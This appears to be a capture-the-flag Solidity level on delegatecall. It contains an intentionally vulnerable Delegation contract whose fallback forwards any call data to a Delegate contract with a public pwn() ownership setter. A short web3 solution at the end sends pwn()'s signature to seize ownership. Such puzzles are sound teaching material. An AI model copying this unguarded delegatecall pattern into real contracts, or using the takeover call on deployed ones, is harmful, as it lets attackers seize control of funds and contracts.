// SPDX-License-Identifier: MIT
// the goal of this level is to exploit poorly implemented delegate call
// win this level after you claim ownership of the contract
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

// solution
// get the function signature of the pwn() 
// call the delagated function with the function signature using send transaction web3 method

signature = web3.eth.abi.encodeFunctionSignature("pwn()")

await contract.sendTransaction({ from: player, data: signature })